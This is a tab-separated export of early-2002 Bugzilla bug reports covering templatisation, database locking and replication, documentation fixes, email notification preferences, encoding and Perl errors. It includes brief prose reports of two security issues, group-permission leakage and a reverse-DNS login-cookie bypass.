124587%TAB%1013230635%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%lock the bugs table for writing when inserting a new bug%TAB%lock the bugs table for writing when inserting a new bugbbbaetz makes a good point in bug 87006, comment 14.  post_bug.cgi does not lock the bugs table before inserting a bug.  For installations that use the shadow database, this could result in misordered (or perhaps even missing) shadow database records, because SendSQL first inserts the record into the bugs table and then inserts a record into the shadowlog table that will later create the bug in the shadow database.  If two bugs are created at the same time, the four inserts could happen in the wrong order, switching bug numbers or overwriting one bug with the other (and potentially making everything off by one) in the shadow database.
124589%TAB%1013233887%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%support replication with mysql%TAB%support replication with mysqlThe shadowlog table has lots of issues, and it would be better to deal with those by using replication instead.  However, since mysql won't replicate between two servers on the same port, we need to allow for the shadowdb and the real db to be on different servers/ports. We should also support different sockets, otherwise mysql will ignore the port and use the default socket for localhost (which would be the wrong one).  This means an extra (optional) param in localconfig for the main db, and params for host/port/socket path for the shadow stuff, and the appropriate code to open a second db connection if required.  syncshadowdb would be removed, and the shadowlog table dropped from the db.  Docs describing this would also be added.  Note that this is obviously post-2.16. However, supporting the shadowdb post-pgsql and transaction support is likely to mean a lot of pain. MattyT pointed out that we'd need to obsolete this before removing it. I'm not sure if this is necessarily the case, though - we plan on upping the mysql requirements for 2.18 anyway, and the shadowlog isn't exactly the most reliable part of bugzilla anyway.  Do we have any idea how many sites run with a shadowdb?
124845%TAB%1013412787%TAB%28948%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Bonsai is misspelled in ln command%TAB%Bonsai is misspelled in ln commandSection 3.2.13 - Installing the Bugzilla Files Example 3-1  The ln command references bosaitools instead of bonsaitools.  This could cause confusion after the user runs through the setup commands.
124937%TAB%1013440920%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Templatise show_activity.cgi%TAB%Templatise show_activity.cgiTemplatise show_activity.cgi
125013%TAB%1013488924%TAB%44109%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%ProcessMultipartFormFields hangs%TAB%ProcessMultipartFormFields hangsCreating attachments to bugs with Opera 6.0 may lead to hangs in createattachment.cgi  The  problem is with ProcessMultipartFormFields() and the boundary-string that Opera may send.  According to RFC2046 the boundary string may contain ()+./? which cause problems with the search  for boundaries of ProcessMultipartFormFields.  The attached file resolves the problem by  escaping these special characters.
125066%TAB%1013508645%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Have to set milestone when accepting bug%TAB%Have to set milestone when accepting bugWhen you accept a bug, you have to specify a milestone.  This causes problems with products without milestones.  In addition, there is nothing stopping a user from setting the milestone on acceptance and then changing it back to "---" after accepting it.  I believe there is a configuration option 'milestoneonaccept', but yeah I suppose it would cause problems.  To start with, the notion of "blank milestone" is probably hardcoded to a specific name.
125253%TAB%1013581768%TAB%42418%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General,Bugzilla Helper,Bugzilla-General%TAB%[Brower and Composer | Print preview] component is not on bugzilla helper%TAB%[Brower and Composer | Print preview] component is not on bugzilla helper[Brower and Composer | Print preview] component is not on bugzilla helper. i think it should be there since print preview is in active development and we need to let bug reporters to be able to report it on bugzilla helper.  P.S. isn't the components select box dynamic ? or it needs manual update ?
125300%TAB%1013595433%TAB%43504%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,Administration,attachment and request management%TAB%Make it easy to create an attachment status for all (or multiple) products%TAB%Make it easy to create an attachment status for all (or multiple) productsIt should be possible to propagate a newly created attachment status to all of the products in the system, or perhaps better, to a selected set of products. Currently one must either manually duplicate the status for every product from the UI, or drop to SQL to do it (which is what I'm doing now).
125395%TAB%1013619321%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Should move revision history below table of contents in docs index%TAB%Should move revision history below table of contents in docs indexAs much as it is nice to see at a glance what's changed recently, the revision history just gets in the way for someone who hasn't seen the docs before at all.  Having to scroll down to get to the table of contents is counterintuitive, and all of my UI instincts tell me they table of contents should be right there when you link to the docs. :)
125427%TAB%1013630561%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Taint error in duplicates.cgi with perl < 5.6 ("Insecure dependency in glob")%TAB%Taint error in duplicates.cgi with perl < 5.6 ("Insecure dependency in glob")When running duplicates.cgi with perl 5.005_02 I get the following software error:  Insecure dependency in glob while running with -T switch at /home/bugzilla/apache/htdocs/duplicates.cgi line 82.   The line where the error occurs is:  	if (<data/duplicates/dupes$today*>)  This error does not occur with perl 5.6.0.  <Quotes from bbaetz on IRC>  bbaetz@landfill:~$ perl -wT  if (<foo*>) { print "FOO\n"; } bbaetz@landfill:~$ perl5.00503 -wT if (<foo*>) { print "FOO\n"; } Insecure dependency in glob while running with -T switch at - line 1. bbaetz@landfill:~$   since dbmopen will create the file if it doesn't exist, we need to check for existance but we can't...  perldelta says that they no longer spawn csh for globbing thats probably it  I think that it needs to use tie rather than dbmopen and then set the mode to not create  </Quotes>
125516%TAB%1013674440%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%Exim as MTA: -ti doesn't work -> NO EMAIL IS SENT%TAB%Exim as MTA: -ti doesn't work -> NO EMAIL IS SENTThis is the CVS version of Bugzilla My MTA has problems with the option -ti, but -i -t works.  Recently the -i option was introduced which doesn't quit when a single dot is in a line. But Exim doesn't like the -ti option. It understands the -t -i though.  Patch to come
125660%TAB%1013732654%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Templatise process_bug.cgi%TAB%Templatise process_bug.cgiThis file needs templatising. (Well, it needs a complete reorganisation, but we don't have time for that, so templatisation will have to do.) It should probably wait until show_bug.cgi and long_list.cgi are done, because those patches touch this file.
125835%TAB%1013795535%TAB%38316%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Installation & Upgrading%TAB%Bad comments about database security%TAB%Bad comments about database securitythe following comments are easily misconstrued in the wrong way, and look bad against bugzilla and mozilla.org:  from localconfig: # Some people actually use passwords with their MySQL database ... #  I propose this should be changed into a comment advocating passwords (because it is entirely possible to take down the database or do bad things when not using passwords), and as such i have attached a suitable comment, in diff format.
125975%TAB%1013902077%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,bugzilla.org%TAB%Process Documentation%TAB%Process DocumentationWe need someone to document our processes.  This will help people help us and take over where necessary.  Development/Review Process --------------------------  All new development should adhere to the Hackers' Guide. How the reviewing process works. How do I become a reviewer? How to check in  Release Notes -------------  Update dependencies, important outstanding issues, introduction, deprecated features. Add new section for changes from last version.  Check through Bonsai and Bugzilla for interesting changes to add. Keep style of existing document, esp. with regard to bug numbers, sections and indentation. Remember to scan change sections from previous versions of the release notes.  They make need to be updated for users jumping over versions.  Documentation -------------  Compiling the documentation. Using macros.  Releasing ---------  Use the existing list on the release tracking bug. Mention creating release tracking and notes bug (if its not on the list just mentioned).   Any more thoughts on these documents, or more documents?
125978%TAB%1013904598%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Remove process documentation (Hackers' Guide) from Bugzilla Guide.%TAB%Remove process documentation (Hackers' Guide) from Bugzilla Guide.Process documentation (bug #125975) is continually updated to reflect the changes in Bugzilla.  I suggest people should be encouraged to look at this online (on the web site somewhere), and not in their tarballs which can be out of date.  Currently, the only process documentation I know of is the Hackers' Guide.  This is a part of the Bugzilla Guide, but I think it shouldn't be.  Instead, I think it should be moved to a new process documentation section on the web site which can be kept up to date.  There seemed to be approval of this from the small number of people polled on IRC, but of course we'll see what barnboy has to say about this.  Barnboy would continue to look after the Hackers' Guide if he wished.  Or instead, I would be willing to deal with all process documentation if it was determined to be a good idea.
126252%TAB%1014028148%TAB%42986%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Installation & Upgrading%TAB%gnats2bz.pl rewrite%TAB%gnats2bz.pl rewriteFor converting the gcc gnats database from gnats to bugzilla, we needed a lot more features than gnats2bz.pl So I worked on it quite a bit, making it faster, and adding a ton of features. It's basically a rewrite, in that i've added more code than existed before.  I was asked to file an RFE with the script attached, so i'm doing so. List of changes:  10x faster (used to take 45 minutes to handle the 270 meg of gcc gnats reports, now takes 4.5 minutes), even with all the rest of the changes.  Mainly due to changing the pr parser to be based on the one in gnatsweb, which is absurdly fast. If you don't need any of the below, just replacing the parser will probably buy you a 20x speedup (i didn't do speed testing till i was finished, but its a bit slower than it was when i first replaced the parser)  Chunks audit trail into separate comments, with the right From's, times, etc.  Handles followup emails that are in the report, with the right From's, times, etc.  Properly handles duplicates, adding the standard bugzilla duplicate message.  Extracts and handles gnatsweb attachments, as well as uuencoded attachments appearing in either followup emails, the how-to-repeat field, etc.  Replaces them with a message to look at the attachments list, and adds the standard "Created an attachment" message that bugzilla uses.  Handling them includes giving them the right name and mime-type. "attachments" means multiple uuencoded things/gnatsweb attachments are handled properly.  Handles reopened bug reports.  Builds the cc list from the people who have commented on the report, and the reporter.  Other things i've forgotten, i'm sure (I fixed many bugs regarding parsing of email addresses, etc)  It's hard, at first glance, to tell the result from a bugzilla database built from scratch.  The patch is actually larger than gnats2bz.pl currently.  It has a *few* gcc specific things that are easy to remove:  1.  we don't use op_sys and rep_platform, since you can build on any host, for any build os, for any target.  Thus, we use a build, host, and target field with the triplet (ie i686-pc-linux-gnu) in them. 2.  Because almost all of our attachments are text, and large text at that (preprocessed source files), all attachments data is compressed with  Compress::Zlib.   This is also because noone will ever want to full-text search it.  Removing these two is a matter of just changing a few lines.  You can see the result (no changes, this is what running the script gives you) at www.dberlin.org/bugzilla-2.14
126266%TAB%1014033050%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Bugzilla should send encoding ISO-8859-1 per default,Allow administrator to set charset encoding for pages and email,Use UTF-8 (Unicode) charset encoding for pages and email,Use UTF-8 (Unicode) charset encoding for pages and email for new installations,Use UTF-8 (Unicode) charset encoding for pages and email for NEW installations%TAB%Bugzilla should send encoding ISO-8859-1 per default,Allow administrator to set charset encoding for pages and email,Use UTF-8 (Unicode) charset encoding for pages and email,Use UTF-8 (Unicode) charset encoding for pages and email for new installations,Use UTF-8 (Unicode) charset encoding for pages and email for NEW installationsPresently the bugzilla webpages don't contain an encoding header. Neither do the emails.  Expected: - The HTML pages come with an encoding header such as:   <meta http-equiv="content-type" content="text/html; charset=iso-8859-1"> - The emails come with an encoding header such as:   MIME-version: 1.0   Content-type: text/plain; format=flowed; charset=ISO-8859-1   Content-transfer-encoding: 8BIT  Reasoning: The encoding information makes sure that the 8bit characters are shown correctly. I have chosen ISO-8859-1 (Latin1) since it is most spread (though not as "good" as UTF8) and is the default encoding of MySQL.
126456%TAB%1014114549%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Fix our error handling%TAB%Fix our error handlingWe should implement and use something like the following before 2.16. This is to get content-type headers right, and pave the way for l10n.  UserError("message"). Prints content type, and uses a template to format the error message. Called anywhere in any CGIs.  CodeError("message", hashref). Also prints a content-type and attempts to use a template, but falls back on a non-template error message if that fails. Optionally logs info to a file for diagnosis of bugs. hashref is an optional ref to a hash; the log would print the contents as: foo: bar baz: 73  TemplateError("content-type"). Does not print a content-type, but produces the correct sort of "template failed" error message for the given content-type. This should be in the || arm of all template calls, and nowhere else.
126487%TAB%1014120834%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%Edit attachment as comment submits attachment as comment before user can edit%TAB%Edit attachment as comment submits attachment as comment before user can editEdit attachment as comment submits attachment as comment before user can edit. I believe this broke when jkeiser checked in some form submission changes in the last few days.   You can test by clicking the button "edit attachment as comment" at this landfill bug http://landfill.tequilarista.org/bugzilla-tip/attachment.cgi?id=18&action=edit (or some other less spammy bug if you prefer).
126496%TAB%1014123033%TAB%44700%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%No instructions for how to prepare for templates%TAB%No instructions for how to prepare for templatesTemplates are *major* feature I need, so I'm trying to prepare for templates by  reading zillion bug discussions and scanning through 2.15 code, which is  tedious and time-wasting. Is there anywhere a consistent document/discussion  how can I take advantage of this wonderfull new feature the very same day 2.16  is released?
126754%TAB%1014205546%TAB%40395%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Form Controls,Bugzilla Helper,Bugzilla-General%TAB%extra characters in Mozilla Bug Reporting Form%TAB%extra characters in Mozilla Bug Reporting FormThere appears to be extra characters in the Bug Reporting Form at <http://www.mozilla.org/quality/help/bugzilla-helper.html>.  The specific form element is textarea used for "Steps to Reproduce".  Reproducible: Always Steps to Reproduce: 1. Load the example page. 2. Put the insertion point after "3.". 3. Press BACKSPACE twice. (notice where the insertion point is) 4. Type something.  Actual Results:  The typed words appear on the third line.  Expected Results:  Either One: The insertion point remains on the third line. or Two: The hidden character is deleted after the second BACKSPACE.  The code in the page is: <textarea rows=5 cols=70 name=ReproduceSteps wrap=virtual></textarea>.  From this, I don't know where the numbering comes from in the first place.  Upon further inspection, I saw this line: <script type="text/javascript" language="JavaScript1.2" src="./bugreport.js"></script>  This makes me believe the culprit is actually JavaScript, but I don't know.
126756%TAB%1014205873%TAB%40395%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%US General,Bugzilla Helper,Bugzilla-General%TAB%error submitting Javascript Engine bug%TAB%error submitting Javascript Engine bugJavascript Engine bugs receive an error message.  Reproducible: Always Steps to Reproduce: 1. Load the sample URL <http://www.mozilla.org/quality/help/bugzilla-helper.html>. 2. Write a bug and select the JavaScript Engine component. 3. Submit the bug.  Actual Results:  Error Message:   Possible bug database corruption has been detected. Please send mail to endico@mozilla.org with details of what you were doing when this message appeared. Thank you.
126788%TAB%1014209869%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Templatize xml.cgi%TAB%Templatize xml.cgiCurrently, xml.cgi displays a small "enter bug numbers" box, and then uses Bug::EmitXML to produce the XML.  With forwards-compatibility and minimisation of work in mind, what's the best way to structure the templatisation? The current thing seems only half object-oriented, because the idea of a function Bug::XMLHeader seems like a hack.  Do we alter Bug::EmitXML, Bug::XMLHeader and Bug::XMLFooter to use a template, or do the whole thing in xml.cgi, or what?
126789%TAB%1014209895%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Templatise token.cgi%TAB%Templatise token.cgiTemplatise token.cgi
126791%TAB%1014209907%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Templatise relogin.cgi%TAB%Templatise relogin.cgiTemplatise relogin.cgi
126792%TAB%1014209925%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Templatise showdependencygraph.cgi,Templatise showdependencytree.cgi%TAB%Templatise showdependencygraph.cgi,Templatise showdependencytree.cgiTemplatise showdependencygraph.cgi,  Templatise showdependencytree.cgi
126793%TAB%1014209941%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Templatise showdependencytree.cgi,Templatise showdependencygraph.cgi%TAB%Templatise showdependencytree.cgi,Templatise showdependencygraph.cgiTemplatise showdependencytree.cgi,  Templatise showdependencygraph.cgi
126801%TAB%1014211629%TAB%44642%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Documentation,Query/Bug List%TAB%queryhelp.cgi ignores group-permissions - showing ALL products%TAB%queryhelp.cgi ignores group-permissions - showing ALL productsif you login to bugzilla as an user without having permissions ( usebuggroups:on, usebuggroupsentry: on) to show specific products, all the products AND components are listed on the help-site http://localhost/bugzilla/queryhelp.cgi   This is shown also WITHOUT login to the system !!! It is a security bug !
126883%TAB%1014230486%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bugzilla.dtd isn't quite correct%TAB%bugzilla.dtd isn't quite correctAs pointed out on npm.webtools, the dtd has a couple of optional elements (exporter and urlbase) which shouldn't be there.  The stuff exported from landfill fails validation however, because it is missing op_sys. This is because the enum value is invalid. Not sure how that happened, and it occurs on bmo as well. However, the last bug # affected by this on bmo is bug 56209, so whatever the corruption this was has presumably been fixed.  On the newsgroup, I said that we should still output empty values, because of this. I think I've changed my mind - bugzilla is not guarenteed to give correct information if sanity checks fail (Of course, they should never be allowed to fail, but theres not much option with mysql). I've therefore added a sanity check for this so that we do fail the checks.  Anyway, an op_sys of '' isn't likely to be valid on the other end.
126907%TAB%1014238454%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Remove Future from Bugzilla Guide.%TAB%Remove Future from Bugzilla Guide.'Future' shouldn't be in the Bugzilla Guide.  It was never completed, contains opinions which (unfortunately for us all) are not shared by the whole team, contains out of date comments, and so on.  It would be to point to the master plan on the web page.
126955%TAB%1014257695%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Bugzilla should support translated/localized templates%TAB%Bugzilla should support translated/localized templatesBugzilla should support a translated user interface.  The first and easierst step is to translate the templates which is almost enough for the beginning since those contain most of the stings to be translated. (There are two kinds of installations: Those which use only one language and those which support bugreports in several languages)  Proposed new directory layout (inspired by /usr/share/man/):  templatex/default/ -- default language (en) templatex/default/<languagecode>/ -- other languages (such as de, en-GB,...) templatex/custom/ -- default language (en) templatex/custom/<languagecode>/ -- other languages  The cgi's should then support the Accept-Language header to choose the template (this is not the easiest task since the Accept-Language header can contain things like fr-FR which should match fr-FR and fr ...)   I have a "default/de/" ready sitting here, if someone wants to check it in, drop a mail. (This is actually independend of having the neede perl support since one can us it to replace the English version in default.  And my have the time to dig into the perl part. checksetup.pl should probably used to create a list of supported languages and the admin should probably have the possibility to restrict the languages to a subset (this sounds a bit like hacking defparms.pl). Additionally a link list where one can choose the desired language would be neat (such as %commandmenu%).
127065%TAB%1014287418%TAB%44862%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Typo in Priority help text (bug_status.html)%TAB%Typo in Priority help text (bug_status.html)"This field is utilized by the programmers/engineers to prioritized their work to be done."  prioritized should be prioritize
127200%TAB%1014341042%TAB%25549%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%Query for CC takes long time,Query for CC/longdesc/OR takes long time%TAB%Query for CC takes long time,Query for CC/longdesc/OR takes long timeReproduction:  1. Go to Bugzilla page 2. Go to query page 3. Uncheck entries under "Status" 4. Enter "jens@unfaehig.de" under e-mail adress, exact match, matching field CC 5. Run query  The query takes a long time (such a long time that I haven't waited for it to finish, aborted it after some minutes).  Maybe no index in the database for that field?
127318%TAB%1014381944%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Need to push UserInGroup to templates%TAB%Need to push UserInGroup to templatesThe sidebar xul stuff fails because UserInGroup is not pushed to the template. This should be added globally so that other templates can use it (although they should be caching it for speed reasons)
127507%TAB%1014489429%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%comments template adds one too many line,comments template adds one too many lines%TAB%comments template adds one too many line,comments template adds one too many linesThe comments template has:    <pre>     [% quoteUrls(comment.body) %]   </pre>  which produces:  <pre>Comment of some sort   </pre>  Because of the pre block, this adds '\n  ' to the end of each comment.  We default to PRE_CHOMP, which compresses the first one, but not POST_CHOMP, so the end remains wrapped. Is there a reason for this?  The fix for this is trivial - either add POST_CHOMP => 1 into globals.pl, or just do it for this comment by adding a - before the %.  I prefer the first option, and I didn't see anything which would break on it. It is overridable on a case by case basis. Once we decide, I'll attach a patch for the chosen option.  Comments?
127519%TAB%1014500284%TAB%27170%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Error after change columns%TAB%Error after change columns$::buffer is the query string - its already in uri escaped format, so don't escape it again. dkl - was there a reason for teh additional escaping?  Also, theres no point it putting the query string in there twice, just because the original cgi did so.
127524%TAB%1014509027%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%checksetup.pl fails with XML::Parser error.%TAB%checksetup.pl fails with XML::Parser error.When I pull a new 2.15 tree and run checksetup.pl, the following happens:  Checking perl modules ... Checking for             DBI (v1.13)   ok: found v1.15 Checking for    Data::Dumper (any)     ok: found v2.102 Checking for      DBD::mysql (v1.2209) ok: found v2.0416 Checking for     Date::Parse (any)     ok: found v2.20 Checking for       AppConfig (v1.52)   ok: found v1.52 Checking for        Template (v2.06)   ok: found v2.06 Checking for      Text::Wrap (v2001.0131) ok: found v2001.0131 Checking for       CGI::Carp (any)     ok: found v1.20  The following Perl modules are optional: Checking for              GD (v1.19)   ok: found v1.33 Checking for     Chart::Base (v0.99)   ok: found v0.99 Checking for     XML::Parser (any)      not found  If you want to use the bug import/export feature to move bugs to or from other bugzilla installations, you will need to install the XML::Parser module by running (as root)     perl -MCPAN -e'install "XML::Parser"'  Checking user setup ...  An error has occurred while reading your 'localconfig' file.  The text of the error message is:   Uncaught exception from user code:         Can't locate XML/Parser.pm in @INC (@INC contains: /usr/local/lib/perl5/5.6.1/i686-linux /usr/local/lib/perl5/5.6.1 /usr/local/lib/perl5/site_perl/5.6.1/i686-linux /usr/local/lib/perl5/site_perl/5.6.1 /usr/local/lib/perl5/site_perl .) at ./checksetup.pl line 166.         eval {...} called at ./checksetup.pl line 166         main::have_vers('XML::Parser', 0) called at ./checksetup.pl line 210     Please fix the error in your 'localconfig' file. Alternately rename your 'localconfig' file, rerun checksetup.pl, and re-enter your answers.     $ mv -f localconfig localconfig.old   $ ./checksetup.pl     Uncaught exception from user code:         Syntax error in localconfig at ./checksetup.pl line 285.   No localconfig file is generated. The same error appears running checksetup.pl multiple times. I have to get around this by stealing a localconfig file from an earlier Bugzilla.
127841%TAB%1014700047%TAB%45120%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Documentation%TAB%Few file arguments missing in example for perl path substitutions%TAB%Few file arguments missing in example for perl path substitutionsThere are few file arguments missing in 3.2.13 Installing the Bugzilla Files  The command: perl -pi -e 's@#!/usr/bonsaitools/bin/perl@#!/usr/bin/perl@' \ *cgi *pl Bug.pm  Should be modified to: perl -pi -e 's@#!/usr/bonsaitools/bin/perl@#!/usr/bin/perl@' \ *cgi *pl Bug.pm processmail syncshadowdb  i. e., add processmail and syncshadowdb to argument list. Otherwise bugzilla will not send bug change notifications (unfortunately without any error message).
127862%TAB%1014706510%TAB%37636%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Administration%TAB%Sanity Check fails if regex excludes email-adresses with uppercase letters%TAB%Sanity Check fails if regex excludes email-adresses with uppercase lettersThe Sanity Check reports every lowercase emailadress as invalid, if the regexp in the parameters is set to allow no uppercase letters in e-mail-addresses.  emailregexp: ^[^@A-Z]+@[^@A-Z]+\.[^@A-Z]+$  An e-mail-address like "andreas.hoefler@infonova.at" results in following line(s) when sanity-checking:  ... Checking profile logins Bad profile email address, id=1, <andreas.hoefler@infonova.at>.
127995%TAB%1014762215%TAB%44967%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Show the size of the attachments in show_bug.cgi%TAB%Show the size of the attachments in show_bug.cgiIt could sometimes be good to know how big the attachments are. For example when you are on a slow link and don't want to download 300k+ diffs.
128419%TAB%1014948727%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%link to email preferences from bug changed notification is wrong%TAB%link to email preferences from bug changed notification is wrongThe link from the bug changed notification to the email preferences page is wrong.  It contains the following URL made obsolete by the changes in bug 117060:  http://localhost/bztip/userprefs.cgi?bank=diffs  The URL should be:  http://localhost/bztip/userprefs.cgi?tab=email
128422%TAB%1014950297%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%all users receive email on all changes regardless of email preferences%TAB%all users receive email on all changes regardless of email preferencesThe code in bug 117060, checked into the tip recently, has a serious bug that causes all users to receive email on all changes regardless of their email preferences, because it no longer stores email preferences that are "off" and assumes missing preferences are "off", while processmail assumes missing preferences are "on" so that adding a new preference defaults that preference to "on" for all users.  A side-effect (or perhaps separate bug) is that when an installation adds a new preference, processmail correctly defaults it to "on" for all users, but when a user goes to the email preferences tab for the first time after the preference has been added all the checkboxes for the preference are un-checked.
128437%TAB%1014954308%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%new email preferences appear to be off on "edit email preferences" page%TAB%new email preferences appear to be off on "edit email preferences" pageWhen a user goes to the "edit email preferences" page after the Bugzilla installation has added a new preference, the new preferences appear to be turned off, even though they are actually turned on (and the user has been receiving the applicable email since the new preference was added).  See bug 128422 for further explanation of why this happens.
128469%TAB%1014968211%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%seriously clean up email filtering code%TAB%seriously clean up email filtering codeThe code that filters emails in processmail to determine who should and should not get notification of certain bug changes is in serious need of clean up both for performance/efficiency reasons and to make it much easier to understand what is going on in that code and how to extend it.
128784%TAB%1015196570%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%Redundant use of DBNameToIDAndCheck in userprefs.cgi%TAB%Redundant use of DBNameToIDAndCheck in userprefs.cgiThe new userprefs.cgi that was recently checked in contains the following code:  confirm_login();      GetVersionTable();  $userid = DBNameToIdAndCheck($::COOKIE{'Bugzilla_login'});  The last of these three lines is unnecessary.  confirm_login, two lines above, already does this.  (Including setting the value of $::userid).  We shouldn't need to have $userid declared as a local variable here.
128839%TAB%1015221098%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications,User Interface%TAB%email preferences redesign%TAB%email preferences redesignThat description is a bit ambiguous, so let me clarify further.  This bug is for redesigning the "email preferences" page.  Some redesign work already took place during the templatization of userprefs.cgi (bug 117060), but more needs to be done because of new email preferences for unconfirmed bugs (bug 122900, from which this bug is broken off) and disabling all notifications (bug 123971), which might work better as "excluding" preferences.  This bug probably relies on the email preferences table work going on in bug 73665.  Adding dependency ot bug 73665, moving to User Interface component, and reassigning to default owner and QA contact of that component.
129016%TAB%1015292668%TAB%37636%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Error in checking bug_status in post_bug.cgi%TAB%Error in checking bug_status in post_bug.cgiWhen posting a bug then following error-message(s) appear in the apache-errorlog  [Tue Mar  5 11:32:23 2002] post_bug.cgi: Argument "UNCONFIRMED" isn't numeric in numeric eq (==) at /usr/local/httpd/htdocs/bugzilla/post_bug.cgi line 129. Argument "NEW" isn't numeric in numeric eq (==) at         /usr/local/httpd/htdocs/bugzilla/post_bug.cgi line 129 (#1) [Tue Mar  5 11:32:23 2002] post_bug.cgi: Argument "NEW" isn't numeric in numeric eq (==) at /usr/local/httpd/htdocs/bugzilla/post_bug.cgi line 129. Use of uninitialized value in split at /usr/lib/perl5/5.6.1/Cwd.pm line 103 (#1)
129017%TAB%1015293209%TAB%37636%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%Perl-error in apache-log when executing query.cgi%TAB%Perl-error in apache-log when executing query.cgiWhen querying, then following error appears in the apache-errorlog:  [Tue Mar  5 11:12:12 2002] query.cgi: Argument "" isn't numeric in numeric gt (>) at (eval 6) line 404. Argument "" isn't numeric in numeric gt (>) at (eval 6) line 404 (#1)  But there is no line 404?!?
129315%TAB%1015407597%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%incorrect column definition for bugs.delta_ts%TAB%incorrect column definition for bugs.delta_tsThe bugs.delta_ts field is defined as being able to contain NULL values, even though it is initialized to the current date/time when a new record is created in that table and is never set to NULL.  It should be defined as *not* being able to contain NULL values.
129442%TAB%1015462687%TAB%45688%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Make HTML of a default installation HTML W3C compliant%TAB%Make HTML of a default installation HTML W3C compliantMake HTML of bugzilla HTML Transitional 4.01 compliant, Patch attached.  Before : http://www.gnome.org/~chema/html_verify_bugzilla_before.html  After: http://www.gnome.org/~chema/html_verify_bugzilla_after.html  regards, Chema
129466%TAB%1015473775%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Accounts%TAB%logincookies IP check can be bypassed%TAB%logincookies IP check can be bypassedThe logincookies table has a hostname field. This is obtained from the webserver via REMOTE_HOST env variable. The webserver gets this by doing a reverse DNS lookup. Therefore an attacker which can provide reverse dns for their IP can bypass the IP address checks by providing the hostname of the user they want to spoof.   Hostname lookups are disabled by default in apache, so this won't affect most people, which is why if you look at your logincookies table you'll see ip addresses. Its still an attack, though, and should be fixed for 2.16.  I've been looking for an excuse to get bug 20122 in for 2.16, and since fixing this bug is about 2/3 of the work I'll use this. ;)  An open question which I was thinking about before I realised the security issues: REMOTE_ADDR can be ipv4 or ipv6. If its ipv4, then the field is set to varchar(15) NOT NULL (or int4 NOT NULL) and we're done. If its ipv6, the field has to be larger. (I don't plan on supporting the netmask stuff for ipv6). If we want to validate that the string given by the server is actually an IP, then we have to drag in some more modules.
